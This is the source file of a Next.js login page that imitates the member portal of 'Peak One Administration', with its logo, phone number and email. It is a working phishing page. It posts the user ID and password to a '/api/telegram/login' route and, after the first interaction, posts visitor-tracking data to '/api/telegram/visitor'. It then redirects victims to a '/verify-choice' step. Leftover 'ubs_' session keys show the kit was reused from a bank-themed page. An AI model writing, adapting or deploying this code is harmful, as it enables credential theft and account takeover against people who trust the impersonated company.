"use client";

import { useState, useEffect, useRef } from "react";
import type { FormEvent } from "react";
import { useRouter } from "next/navigation";
import { Preloader } from "@/components/preloader";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  const handleSignIn = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);
    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Login failed");
      }
      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }
      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Login failed. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <>
          <style>{`
            *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
            body{font-family:'Open Sans',Arial,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column;font-size:14px;}
            .topnav{background:#fff;border-bottom:1px solid #ddd;padding:8px 18px;display:flex;align-items:center;gap:24px;}
            .peakone-logo{height:44px;width:auto;display:block;flex-shrink:0;}
            .contact-block{display:flex;flex-direction:column;gap:2px;font-size:0.8rem;color:#444;}
            .contact-row{display:flex;align-items:center;gap:6px;}
            .contact-row svg{flex-shrink:0;color:#555;}
            .nav-login-label{font-size:1.3rem;font-weight:300;color:#444;margin-left:4px;}
            main{flex:1;display:flex;flex-direction:column;align-items:flex-start;padding:36px 20px 56px;padding-left:120px;}
            .login-wrapper{width:100%;max-width:100%;display:flex;flex-direction:column;align-items:flex-start;gap:0;}
            .lock-wrap{margin-bottom:12px;align-self:center;margin-top:0;}
            .privacy-note{font-size:0.8125rem;color:#555;text-align:center;max-width:420px;line-height:1.55;margin-bottom:12px;margin-top:0;align-self:center;}
            .signin-heading{font-size:1rem;font-weight:400;color:#333;margin-bottom:28px;margin-top:0;align-self:center;}
            form{width:100%;max-width:420px;}
            .field-group{margin-bottom:18px;}
            .field-label{font-size:0.8125rem;color:#444;margin-bottom:5px;display:flex;align-items:center;gap:3px;}
            .req{color:#e8a020;font-size:0.8rem;}
            input[type="text"],input[type="password"]{width:100%;height:36px;border:1px solid #aaa;border-radius:2px;padding:0 10px;font-size:0.875rem;font-family:'Open Sans',sans-serif;color:#333;outline:none;background:#fff;transition:border-color 0.15s,box-shadow 0.15s;}
            input[type="text"]:focus,input[type="password"]:focus{border-color:#8a7a4a;box-shadow:0 0 0 2px rgba(138,122,74,0.14);}
            .field-group.has-error input{border-color:#c0392b;}
            .field-help{font-size:0.75rem;color:#555;margin-top:5px;}
            .field-help a{color:#1a6a9a;text-decoration:none;}
            .field-help a:hover{text-decoration:underline;}
            .err-msg{display:none;font-size:0.72rem;color:#c0392b;margin-top:4px;}
            .field-group.has-error .err-msg{display:block;}
            .btn-signin{background:#9a8650;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;gap:10px;margin-bottom:18px;transition:background 0.15s,transform 0.08s;}
            .btn-signin:hover{background:#7d6c40;}
            .btn-signin:active{transform:scale(0.99);}
            .btn-signin:disabled{opacity:0.65;cursor:not-allowed;}
            @keyframes spin{to{transform:rotate(360deg);}}
            .spin-ring{display:none;width:14px;height:14px;border:2px solid rgba(255,255,255,0.35);border-top-color:#fff;border-radius:50%;animation:spin 0.65s linear infinite;}
            .no-account-text{font-size:0.8rem;color:#555;margin-bottom:8px;}
            .btn-register{background:#5a6378;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;gap:10px;transition:background 0.15s;}
            .btn-register:hover{background:#424a5c;}
            footer{background:#e0e0e0;padding:22px 20px 16px;text-align:center;}
            .footer-links{display:flex;justify-content:center;gap:32px;margin-bottom:8px;}
            .footer-links a{font-size:0.8125rem;color:#444;text-decoration:none;letter-spacing:0.04em;font-weight:600;text-transform:uppercase;}
            .footer-links a:hover{text-decoration:underline;}
            .footer-copy{font-size:0.72rem;color:#666;}
            #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(10px);background:#333;color:#fff;font-size:0.8rem;padding:9px 18px;border-radius:3px;opacity:0;pointer-events:none;transition:opacity 0.2s,transform 0.2s;z-index:9999;white-space:nowrap;}
            #toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
            @media(max-width:700px){
              .topnav{flex-direction:column;gap:12px;}
              .nav-login-label{margin-left:0;}
              main{padding:32px 16px 40px;padding-left:16px;align-items:center;}
              .login-wrapper{align-items:center;}
              .lock-wrap{max-width:none;width:100%;}
              .signin-heading{max-width:none;width:100%;}
              .privacy-note{max-width:none;width:100%;}
            }
          `}</style>
          <nav className="topnav">
            <a href="#" onClick={(e) => e.preventDefault()}>
              <img
                className="peakone-logo"
                src="/PeakOne-Logo-1.jpg"
                alt="Peak One Administration"
              />
            </a>
            <div className="contact-block">
              <div className="contact-row">
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <rect x="5" y="2" width="14" height="20" rx="2" />
                  <line x1="12" y1="18" x2="12" y2="18" />
                </svg>
                866.315.1777
              </div>
              <div className="contact-row">
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
                  <polyline points="22,6 12,13 2,6" />
                </svg>
                membercare@peakoneadmin.com
              </div>
            </div>
            <span className="nav-login-label">Login</span>
          </nav>
          <main>
            <div className="login-wrapper">
              <form id="login-form" onSubmit={handleSignIn}>
                <div className="lock-wrap flex justify-center">
                  <svg
                    width="44"
                    height="44"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#555"
                    strokeWidth="1.3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                    <path d="M7 11V7a5 5 0 0110 0v4" />
                    <circle cx="12" cy="16" r="1" fill="#555" stroke="none" />
                  </svg>
                </div>

                <p className="privacy-note">
                  We will maintain the confidentiality of your personal
                  information in accordance with our privacy policy.
                </p>

                <p className="signin-heading flex justify-center">Sign in</p>
                <div className="field-group" id="fg-user">
                  <div className="field-label">
                    UserId <span className="req">*</span>
                  </div>
                  <input
                    type="text"
                    id="userid"
                    autoComplete="username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    onInput={() => {
                      const el = document.getElementById("fg-user");
                      if (el) el.classList.remove("has-error");
                    }}
                  />
                  <div className="field-help">
                    Forgot your Username?{" "}
                    <a href="#" onClick={(e) => e.preventDefault()}>
                      Let us help
                    </a>
                  </div>
                  <div className="err-msg">Please enter your User ID.</div>
                </div>

                <div className="field-group" id="fg-pwd">
                  <div className="field-label">
                    Password <span className="req">*</span>
                  </div>
                  <input
                    type="password"
                    id="password"
                    autoComplete="current-password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onInput={() => {
                      const el = document.getElementById("fg-pwd");
                      if (el) el.classList.remove("has-error");
                    }}
                  />
                  <div className="field-help">
                    Forgot your Password?{" "}
                    <a href="#" onClick={(e) => e.preventDefault()}>
                      Let us help
                    </a>
                  </div>
                  <div className="err-msg">Please enter your Password.</div>
                </div>

                <input
                  type="text"
                  name="website"
                  value={honeypot}
                  onChange={(e) => setHoneypot(e.target.value)}
                  style={{ display: "none" }}
                  autoComplete="off"
                />

                <button
                  type="submit"
                  className="btn-signin"
                  id="signin-btn"
                  disabled={isLoginLoading || !username || !password}
                >
                  <svg
                    id="signin-check"
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="white"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                  <div className="spin-ring" id="signin-spin"></div>
                  <span id="signin-label">
                    {isLoginLoading ? "Signing in…" : "SIGN IN"}
                  </span>
                </button>

                <p className="no-account-text">Don't have an account?</p>
                <button
                  type="button"
                  className="btn-register"
                  onClick={() => {
                    const el = document.getElementById("toast");
                    if (el) {
                      el.textContent = "Opening registration…";
                      el.classList.add("show");
                      setTimeout(() => el.classList.remove("show"), 2800);
                    }
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="white"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
                    <circle cx="9" cy="7" r="4" />
                    <line x1="19" y1="8" x2="19" y2="14" />
                    <line x1="22" y1="11" x2="16" y2="11" />
                  </svg>
                  REGISTER
                </button>

                {loginError && (
                  <p
                    style={{
                      color: "#c0392b",
                      marginTop: 8,
                      fontSize: "0.75rem",
                    }}
                    aria-live="polite"
                  >
                    {loginError}
                  </p>
                )}
              </form>
            </div>
          </main>

          <footer>
            <div className="footer-links">
              <a href="#" onClick={(e) => e.preventDefault()}>
                TERMS OF USE
              </a>
              <a href="#" onClick={(e) => e.preventDefault()}>
                PRIVACY POLICY
              </a>
            </div>
            <p className="footer-copy">
              Copyright © 2017 Peak1 Administration LLC. All Rights Reserved.
            </p>
          </footer>
        </>
      )}
    </>
  );
}
